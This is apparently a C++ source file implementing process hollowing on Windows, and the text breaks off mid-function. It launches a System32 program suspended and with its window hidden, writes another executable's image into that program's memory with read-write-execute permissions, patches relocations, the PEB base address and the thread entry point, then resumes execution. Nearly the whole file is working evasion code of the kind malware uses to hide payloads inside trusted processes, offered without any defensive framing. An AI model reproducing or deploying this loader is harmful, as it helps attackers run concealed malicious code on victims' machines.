#include "pch.h"

int wmain()
{
	std::wstring sourceAppPath;
	std::wstring targetAppPath;
	std::wstring workingDir;
	WCHAR wszPath[MAX_PATH];

	bool boRet = GetWorkingDirPathW(workingDir, true);
	if (FALSE == boRet)
	{
		return 0;
	}

	sourceAppPath = std::move(workingDir);
	sourceAppPath += SOURCE_APP_NAME;

	DWORD dwRetVal = GetWindowsDirectoryW(wszPath, MAX_PATH);
	if (0 == dwRetVal)
	{
		return 0;
	}

	targetAppPath.assign(wszPath);
	targetAppPath.append(L"\\System32\\");
	targetAppPath.append(TARGET_APP_NAME);

	ProcessHollowing ProcHollowing(sourceAppPath, TARGET_APP_NAME);

	boRet = ProcHollowing.Init();
	if (false == boRet)
	{
		wprintf(L"Init failed");
		return 0;
	}

	boRet = ProcHollowing.CreateHollowedProcess();
	if (false == boRet)
	{
		wprintf(L"CreateHollowedProcess failed");
		return 0;
	}

	//ProcHollowing.WaitForTargetProcess();

	ProcHollowing.Deinit();

	return 0;
}

bool ProcessHollowing::Init()
{
	m_pProcessInfo = new(std::nothrow) PROCESS_INFORMATION;
	if (NULL == m_pProcessInfo)
	{
		return false;
	}
	
	HMODULE ntdllHandle = GetModuleHandle(L"NTDLL.DLL");
	if (ntdllHandle == nullptr)
	{
		delete m_pProcessInfo;
		return false;
	}

	if (m_pfnQueryInformationProcess == nullptr)
	{
		m_pfnQueryInformationProcess = (PFN_NTQUERYINFORMATIONPROCESS)GetProcAddress(ntdllHandle, "NtQueryInformationProcess");
	}
	if (m_pfnQueryInformationProcess == nullptr)
	{
		delete m_pProcessInfo;
		return false;
	}

	if (m_pfnNtUnmapViewOfSection == nullptr)
	{
		m_pfnNtUnmapViewOfSection = (PFN_NTUNMAPVIEWOFSECTION)GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	}
	if (m_pfnNtUnmapViewOfSection == nullptr)
	{
		delete m_pProcessInfo;
		return false;
	}

	//	fixme: free ntdll

	return true;
}

bool ProcessHollowing::Deinit()
{
	if (m_pbyBuffer)
	{
		delete []m_pbyBuffer;
		m_pbyBuffer = nullptr;
	}

	CleanProcess(false);

	return true;
}

bool ProcessHollowing::CreateHollowedProcess()
{
	bool boRet;

	boRet = ReadSourceFile();
	if (false == boRet)
	{
		return boRet;
	}

	//	check if source file is valid pe or not
	boRet = IsPEFile(m_pbyBuffer);
	if (false == boRet)
	{
		return boRet;
	}

	boRet = ExecFile();
	if (false == boRet)
	{
		return boRet;
	}

	boRet = IsWow64Process(m_pProcessInfo->hProcess, &m_boTarget32BitProcess);
	if (false == boRet)
	{
		CleanProcess(true);
		return boRet;
	}

	boRet = GetProcessBaseAddressEx();
	if (false == boRet)
	{
		CleanProcess(true);
		return boRet;
	}

	m_boSource32BitProcess = IsPE32(m_pbyBuffer);

	if (
		(true == m_boSource32BitProcess && true == (bool)m_boTarget32BitProcess)	||
		(false == m_boSource32BitProcess && false == (bool)m_boTarget32BitProcess)
		)
	{
		//wprintf(L"\n CreateHollowedProcess: Architecture is compatible");
	}
	else
	{
		wprintf(L"\n CreateHollowedProcess: Architecture is not compatible");
		CleanProcess(true);
		return false;
	}


	DWORD dwSourceSubsystem = GetSubsytem(m_pbyBuffer, m_boSource32BitProcess);
	DWORD dwTargetSubsystem = GetSubsystemEx(m_pProcessInfo->hProcess, (LPVOID)m_baseAddress, m_boTarget32BitProcess);
	if (-1 == dwTargetSubsystem)
	{
		wprintf(L"\n CreateHollowedProcess: GetSubsystemEx failed.");
		CleanProcess(true);
		return false;
	}

	if (dwSourceSubsystem != dwTargetSubsystem)
	{
		wprintf(L"CreateHollowedProcess: Subsystem are not compatible.");
		CleanProcess(true);
		return false;
	}

	m_boRelocation = HasRelocation(m_pbyBuffer, m_boSource32BitProcess);

	boRet = RunPE();
	if (false == boRet)
	{
		wprintf(L"CreateHollowedProcess: RunPE failed.");
		CleanProcess(true);
		return false;
	}

//	boRet = GetProcessBaseAddress();
//	if (false == boRet)
//	{
//		return boRet;
//	}
//
//	VOID* pvImageBaseAddress = reinterpret_cast<VOID*>(m_baseAddress);
//
//	PLOADED_IMAGE pImage = ReadRemoteImage(m_pProcessInfo->hProcess, pvImageBaseAddress);
//	if (nullptr == pImage)
//	{
//		return false;
//	}
//
//	PLOADED_IMAGE pSourceImage = GetLoadedImage(reinterpret_cast<ULONG_PTR>(m_pbyBuffer));
//	if (nullptr == pSourceImage)
//	{
//		return false;
//	}
//
//	PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders(reinterpret_cast<ULONG_PTR>(m_pbyBuffer));
//
//	//	unampping destination section.
//	NTSTATUS status = m_pfnNtUnmapViewOfSection(m_pProcessInfo->hProcess, pvImageBaseAddress);
//	if (STATUS_SUCCESS != status)
//	{
//		wprintf(L"\n CreateHollowedProcess: m_pfnNtUnmapViewOfSection failed with error(%u)", status);
//		return false;
//	}
//
//	PVOID pRemoteImage = VirtualAllocEx(
//		m_pProcessInfo->hProcess,
//		pvImageBaseAddress,
//		pSourceHeaders->OptionalHeader.SizeOfImage,
//		MEM_COMMIT | MEM_RESERVE,
//		PAGE_EXECUTE_READWRITE
//	);
//	if (NULL == pRemoteImage)
//	{
//		wprintf(L"\n CreateHollowedProcess: VirtualAllocEx failed with error(%u)", GetLastError());
//		return false;
//	}
//
//	ULONG_PTR dwDelta = m_baseAddress - pSourceHeaders->OptionalHeader.ImageBase;
//
//	pSourceHeaders->OptionalHeader.ImageBase = m_baseAddress;
//
//	boRet = WriteProcessMemory(m_pProcessInfo->hProcess, pvImageBaseAddress, m_pbyBuffer, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0);
//	if (false == boRet)
//	{
//		wprintf(L"\n CreateHollowedProcess: WriteProcessMemory failed with error(%u)", GetLastError());
//		return false;
//	}
//
//	for (ULONG i = 0; i < pSourceImage->NumberOfSections; i++)
//	{
//		if (!pSourceImage->Sections[i].PointerToRawData)
//		{
//			continue;
//		}
//
//		PVOID pSectionDest = (PVOID)(m_baseAddress + pSourceImage->Sections[i].VirtualAddress);
//
//		boRet = WriteProcessMemory(m_pProcessInfo->hProcess, pSectionDest, &m_pbyBuffer[pSourceImage->Sections[i].PointerToRawData], pSourceImage->Sections[i].SizeOfRawData, 0);
//		if (false == boRet)
//		{
//			wprintf(L"\n CreateHollowedProcess: WriteProcessMemory 2 failed for section(%S)  with error(%u)", pSourceImage->Sections[i].Name, GetLastError());
//			return false;
//		}
//	}
//
//	if (dwDelta)
//	{
//		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
//		{
//			const char* pSectionName = ".reloc";
//
//			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
//				continue;
//
//			wprintf(L"\n Rebasing image");
//
//			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
//			DWORD dwOffset = 0;
//
//			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
//
//			while (dwOffset < relocData.Size)
//			{
//				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&m_pbyBuffer[dwRelocAddr + dwOffset];
//
//				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
//
//				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
//
//				PBASE_RELOCATION_ENTRY pBlocks =
//					(PBASE_RELOCATION_ENTRY)&m_pbyBuffer[dwRelocAddr + dwOffset];
//
//				for (DWORD y = 0; y < dwEntryCount; y++)
//				{
//					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
//
//					if (pBlocks[y].Type == 0)
//						continue;
//
//					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
//
//					DWORD dwBuffer = 0;
//					ReadProcessMemory(
//						m_pProcessInfo->hProcess,
//						(PVOID)(m_baseAddress + dwFieldAddress),
//						&dwBuffer,
//						sizeof(DWORD),
//						0
//					);
//
//					dwBuffer += (ULONG)dwDelta;
//
//					BOOL bSuccess = WriteProcessMemory(
//						m_pProcessInfo->hProcess,
//						(PVOID)(m_baseAddress + dwFieldAddress),
//						&dwBuffer,
//						sizeof(DWORD),
//						0
//					);
//
//					if (!bSuccess)
//					{
//						wprintf(L"\n WriteProcessMemory 3 failed with error = %d", GetLastError());
//						continue;
//					}
//				}
//			}
//
//			break;
//		}
//	}
//
//	ULONG_PTR dwEntrypoint = m_baseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
//
//	LPCONTEXT pContext = new CONTEXT();
//	pContext->ContextFlags = CONTEXT_INTEGER;
//
//	wprintf(L"\n Getting thread context");
//
//	if (!GetThreadContext(m_pProcessInfo->hThread, pContext))
//	{
//		wprintf(L"Error getting context, error = %d\r\n", GetLastError());
//		return false;
//	}
//
//#ifdef _WIN64        
//	pContext->Rax = dwEntrypoint;
//#else
//	pContext->Eax = dwEntrypoint;
//#endif
//	wprintf(L"Setting thread context\r\n");
//
//	if (!SetThreadContext(m_pProcessInfo->hThread, pContext))
//	{
//		wprintf(L"Error setting context, error = %d\r\n", GetLastError());
//		return false;
//	}
//
//	wprintf(L"Resuming thread\r\n");
//
//	if (!ResumeThread(m_pProcessInfo->hThread))
//	{
//		wprintf(L"Error resuming thread, error = %d\r\n", GetLastError());
//		return false;
//	}

	wprintf(L"Process hollowing complete\r\n");

	return true;
}

bool ProcessHollowing::WaitForTargetProcess()
{
	DWORD dwErrorCode;
	DWORD dwResult;

	if (nullptr == m_pProcessInfo)
	{
		return false;
	}

	dwResult = WaitForSingleObject(m_pProcessInfo->hProcess, INFINITE);
	if (WAIT_OBJECT_0 != dwResult)
	{
		return false;
	}

	BOOL boResult = GetExitCodeProcess(m_pProcessInfo->hProcess, &dwErrorCode);
	if (FALSE == boResult)
	{
	}

	if (INVALID_HANDLE_VALUE != m_pProcessInfo->hThread)
	{
		CloseHandle(m_pProcessInfo->hThread);
		m_pProcessInfo->hThread = INVALID_HANDLE_VALUE;
	}

	if (INVALID_HANDLE_VALUE != m_pProcessInfo->hProcess)
	{
		CloseHandle(m_pProcessInfo->hProcess);
		m_pProcessInfo->hThread = INVALID_HANDLE_VALUE;
	}

	return true;
}

bool ProcessHollowing::RunPE()
{
	bool boRet;

	if (m_boSource32BitProcess)
	{
		if (m_boRelocation)
		{
			boRet = RunPEReloc32();
		}
		else
		{
			boRet = RunPE32();
		}
	}
	else
	{
		if (m_boRelocation)
		{
			boRet = RunPEReloc64();
		}
		else
		{
			boRet = RunPE64();
		}
	}

	return boRet;
}

bool ProcessHollowing::CleanProcess(bool boTerminate)
{
	if (m_pbyBuffer)
	{
		delete[]m_pbyBuffer;
		m_pbyBuffer = nullptr;
	}

	if (nullptr != m_pProcessInfo)
	{
		if (INVALID_HANDLE_VALUE != m_pProcessInfo->hThread)
		{
			CloseHandle(m_pProcessInfo->hThread);
			m_pProcessInfo->hThread = INVALID_HANDLE_VALUE;
		}

		if (INVALID_HANDLE_VALUE != m_pProcessInfo->hProcess)
		{
			if (boTerminate)
			{
				TerminateProcess(m_pProcessInfo->hProcess, (UINT)-1);
			}
			CloseHandle(m_pProcessInfo->hProcess);
			m_pProcessInfo->hProcess = INVALID_HANDLE_VALUE;
		}

		delete m_pProcessInfo;
		m_pProcessInfo = nullptr;
	}

	return true;
}

bool ProcessHollowing::ExecFile()
{
	BOOL boResult;
	STARTUPINFO StartupInfo;

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);

	StartupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = m_boShowWindow ? SW_NORMAL : SW_HIDE;

	boResult = CreateProcessW(
		m_destProcessPath.c_str(),
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&StartupInfo,
		m_pProcessInfo
	);
	if (FALSE == boResult)
	{
		m_dwError = GetLastError();
		return false;
	}

	wprintf(L"ExecFile: CreateProcessW success with PID(%u)", m_pProcessInfo->dwProcessId);

	return true;
}

bool ProcessHollowing::GetProcessBaseAddress()
{
	ULONG returnLength;
	PROCESS_BASIC_INFORMATION procBasicInfo;

	NTSTATUS status = m_pfnQueryInformationProcess(m_pProcessInfo->hProcess, ProcessBasicInformation, &procBasicInfo, sizeof(procBasicInfo), &returnLength);
	if (status == STATUS_SUCCESS)
	{
		PEB_NT peb;
		if (ReadPEB(m_pProcessInfo->hProcess, procBasicInfo.PebBaseAddress, peb))
		{
			m_baseAddress = reinterpret_cast<ULONG_PTR>(peb.ImageBaseAddress);
		}
		else
		{
			return false;
		}
	}

	return true;
}

bool ProcessHollowing::GetProcessBaseAddressEx()
{
	BOOL bReadBaseAddress;
	if (m_boTarget32BitProcess)
	{
		WOW64_CONTEXT CTX = {};
		CTX.ContextFlags = CONTEXT_FULL;
		Wow64GetThreadContext(m_pProcessInfo->hThread, &CTX);
		bReadBaseAddress = ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &m_baseAddress, sizeof(DWORD), nullptr);
	}
	else
	{
		CONTEXT CTX = {};
		CTX.ContextFlags = CONTEXT_FULL;
		GetThreadContext(m_pProcessInfo->hThread, &CTX);
		bReadBaseAddress = ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(CTX.Rdx + 0x10), &m_baseAddress, sizeof(UINT64), nullptr);
	}
	if (!m_baseAddress)
	{
		return false;
	}

	return true;
}

bool ProcessHollowing::ReadSourceFile()
{
	HANDLE hFile = CreateFile(m_sourceProcessPath.c_str(), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return false;
	}

	m_sourceFileSize = GetFileSize(hFile, 0);

	m_pbyBuffer = new BYTE[m_sourceFileSize];

	DWORD dwBytesRead;
	BOOL boRet = ReadFile(hFile, m_pbyBuffer, m_sourceFileSize, &dwBytesRead, 0);
	if (FALSE == boRet || m_sourceFileSize != dwBytesRead)
	{
		CloseHandle(hFile);
		delete[] m_pbyBuffer;
		return false;
	}

	CloseHandle(hFile);
	return true;
}

bool ProcessHollowing::RunPE32()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(
		m_pProcessInfo->hProcess,
		(LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase,
		lpImageNTHeader32->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpAllocAddress == nullptr)
	{
		wprintf(L"\n RunPE32:VirtualAllocEx failed with error(%u).", GetLastError());
		return false;
	}

	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, (LPVOID)m_pbyBuffer, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		VirtualFreeEx(m_pProcessInfo->hProcess, lpAllocAddress, 0, MEM_RELEASE);
		wprintf(L"\n RunPE32: WriteProcessMemory 1 failed with error(%u).", GetLastError());
		return false;
	}

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)m_pbyBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			wprintf(L"\n RunPE32: WriteProcessMemory 2 failed with error(%u) for section(%S).", GetLastError(), (LPSTR)lpImageSectionHeader->Name);
			VirtualFreeEx(m_pProcessInfo->hProcess, lpAllocAddress, 0, MEM_RELEASE);
			return false;
		}
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		wprintf(L"\n RunPE32: Wow64GetThreadContext failed with error(%u).", GetLastError());
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		wprintf(L"\n RunPE32: WriteProcessMemory 3 failed with error(%u).", GetLastError());
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		wprintf(L"\n RunPE32: Wow64SetThreadContext failed with error(%u).", GetLastError());
		return FALSE;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return true;
}

bool ProcessHollowing::RunPE64()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(m_pProcessInfo->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		return false;
	}

	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, m_pbyBuffer, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		return false;
	}

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)m_pbyBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			return false;
		}
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		return FALSE;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return TRUE;
}

bool ProcessHollowing::RunPEReloc32()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(
		m_pProcessInfo->hProcess,
		nullptr,
		lpImageNTHeader32->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpAllocAddress == nullptr)
	{
		return false;
	}

	const DWORD DeltaImageBase = (DWORD)((DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase);

	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD)(DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, m_pbyBuffer, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		return false;
	}

	IMAGE_DATA_DIRECTORY ImageDataReloc;
	bool boRet = GetRelocAddress(m_pbyBuffer, &ImageDataReloc, m_boSource32BitProcess);
	if (false == boRet)
	{
		return false;
	}

	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(
			m_pProcessInfo->hProcess,
			(LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress),
			(LPVOID)((uintptr_t)m_pbyBuffer + lpImageSectionHeader->PointerToRawData),
			lpImageSectionHeader->SizeOfRawData,
			nullptr
		);
		if (!bWriteSection)
		{
			return false;
		}
	}

	if (lpImageRelocSection == nullptr)
	{
		return false;
	}

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;

			ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
		}
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		return false;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		return false;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		return false;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return true;
}

bool ProcessHollowing::RunPEReloc64()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(
		m_pProcessInfo->hProcess,
		nullptr,
		lpImageNTHeader64->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpAllocAddress == nullptr)
	{
		return false;
	}

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, m_pbyBuffer, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		return false;
	}

	IMAGE_DATA_DIRECTORY ImageDataReloc;
	bool boRes = GetRelocAddress(m_pbyBuffer, &ImageDataReloc, m_boSource32BitProcess);
	if (false == boRes)
	{
		return boRes;
	}
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)m_pbyBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			return false;
		}
	}

	if (lpImageRelocSection == nullptr)
	{
		return false;
	}

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
		}
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		return false;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		return false;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		return false;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return true;
}

bool ReadPEB(HANDLE processHandle, void* pebVirtualAddress, PEB_NT& peb)
{
	BOOL status = ReadProcessMemory(processHandle, pebVirtualAddress, &peb, sizeof(PEB_NT), 0);
	return status != FALSE;
}


bool
ExecFile(
	const TCHAR* pcszExePath,
	BOOLEAN bWaitForCompletion,
	BOOLEAN bShowWindow,
	DWORD* pdwError
)
{
	BOOL boResult;
	DWORD dwResult;
	DWORD dwErrorCode;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	if (NULL == pcszExePath || NULL == pdwError)
	{
		return false;
	}

	*pdwError = 0;

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);

	StartupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = bShowWindow ? SW_NORMAL : SW_HIDE;

	boResult = CreateProcessW(
		pcszExePath,
		NULL,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo
	);
	if (FALSE == boResult)
	{
		*pdwError = GetLastError();
		return false;
	}

	if (TRUE == bWaitForCompletion)
	{
		dwResult = WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
		if (WAIT_OBJECT_0 != dwResult)
		{
			CloseHandle(ProcessInfo.hThread);
